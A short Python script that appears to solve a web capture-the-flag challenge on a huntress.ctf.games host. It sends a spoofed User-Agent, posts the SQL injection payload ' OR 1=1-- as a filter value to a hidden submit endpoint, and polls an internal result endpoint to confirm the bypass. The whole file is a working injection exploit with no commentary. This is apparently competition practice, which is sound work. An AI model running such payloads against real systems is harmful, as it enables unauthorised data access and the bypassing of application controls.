import json, time, urllib.request

BASE = "https://5185cd7f1fe25fa46752fcb371ea71ce8a1190603030acfd.2026.huntress.ctf.games"
UA = "web-worker/1.0"
SUBMIT = "/submit-8ac429"
RESULT = "/internal-c75be3"

def req(path, data=None, method="GET"):
    headers = {"User-Agent": UA, "Accept": "application/json"}
    body = None
    if data is not None:
        headers["Content-Type"] = "application/json"
        body = json.dumps(data).encode()
    r = urllib.request.Request(BASE + path, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=15) as resp:
            return resp.status, resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()
    except Exception as e:
        return None, str(e)

print("baseline:", req(RESULT))
time.sleep(0.8)
print("submit:", req(SUBMIT, {"filter": "' OR 1=1-- "}, "POST"))
time.sleep(0.8)
print("result:", req(RESULT))
time.sleep(0.8)
print("result2 (confirm):", req(RESULT))
